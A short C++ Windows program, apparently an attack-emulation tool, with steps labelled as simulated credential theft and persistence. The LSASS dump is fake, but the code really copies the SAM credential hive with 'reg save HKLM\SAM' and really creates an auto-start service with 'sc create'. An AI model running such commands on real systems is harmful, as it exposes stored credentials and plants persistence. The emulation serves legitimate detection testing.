#include <windows.h>
#include <tlhelp32.h>
#include <fstream>
#include <iostream>

DWORD FindProcessId(const std::wstring& name) {
    PROCESSENTRY32W pe;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (std::wstring(pe.szExeFile) == name) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return 0;
}

void SimulateSAMExtraction() {
    system("reg save HKLM\\SAM C:\\Temp\\SAM.save");
}

void SimulateLSASSDump() {
    DWORD pid = FindProcessId(L"lsass.exe");
    if (pid == 0) return;
    std::ofstream out("C:\\Temp\\lsass_simulated.dmp");
    out << "Fake LSASS dump for PID: " << pid << std::endl;
    out.close();
}

void SimulateServiceCreation() {
    system("sc create FakeService binPath= \"cmd.exe /c echo Simulated SYSTEM service\" start= auto");
}

int main() {
    SimulateSAMExtraction();
    SimulateLSASSDump();
    SimulateServiceCreation();

    std::cout << "Simulation complete." << std::endl;
    return 0;
}
